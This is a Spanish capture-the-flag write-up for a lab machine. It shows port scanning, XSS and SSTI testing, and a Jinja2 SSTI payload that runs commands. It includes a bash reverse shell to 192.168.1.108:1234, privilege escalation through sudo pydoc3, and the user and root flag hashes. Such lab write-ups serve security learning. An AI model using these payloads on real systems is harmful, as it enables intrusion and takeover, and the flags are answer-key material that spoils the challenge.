nmap: 192.168.1.130

![[the hackers labs/avanzado/caldo de avecren/nmap.png]]

al entrar al puerto 80 no hay nada mas que un apache, así que ingresamos por el puerto 8089

![[the hackers labs/avanzado/caldo de avecren/pagina principal.png]]

vemos que podemos colocar muchas cosas ahí, así que probé inyectando un XSS

![[prueba2.png]]

y funciona la inyección XSS 

ahora probaremos un ataque SSTI 
una explicación rápida y buena con ejemplos: https://book.hacktricks.wiki/en/pentesting-web/pocs-and-polygloths-cheatsheet/index.html?highlight=%7B%7B7*7%7D%7D#basic-tests-8

![[ssti.png]]

y funciona, porque nos devuelve el valor 

![[ssti2.png]]

de la misma pagina de explicacion encontre este comando

     {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

como se ve en el código podemos ver que que hay un 'id' o sea que al lanzarlo por el ejecutable que hay ahí nos debería mostrar usuarios y grupo. 

![[grupo.png]]

al igual que whoami porque podemos ver que nos muestra el usuario caldo
![[caldo1.png]]

ahora vamos a lanzar una reverse y colocar el puerto en escucha

lanzamos:

     {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c \'bash -i >& /dev/tcp/192.168.1.108/1234 0>&1\'').read() }}


![[reverse.png]]

y estamos dentro y también de primero nos da la flag de usuario

![[user1.png]]

al hacer un sudo -l  vemos que a nivel de sudoers podemos ejecutar el binario pydoc3 para generar documentación a partir de módulos de Python.
y en un blog chino https://cloud.tencent.com.cn/developer/information/%E5%A6%82%E4%BD%95%E6%9F%A5%E7%9C%8Blinux%E4%B8%8A%E7%9A%84ftp que se tradujo a español encontré este comando

     sudo pydoc3 -b 8888

que si lo ejecutamos nos mandara aquí

![[the hackers labs/avanzado/caldo de avecren/ejecucion1.png]]

colocamos

     !/bin/sh


nos saldremos y haremos un bash -p

![[the hackers labs/avanzado/caldo de avecren/root.png]]

y seremos root! 





f3e431cd1129e9879e482fcb2cc151e8 user
44df858281024b69291f503f8921136c root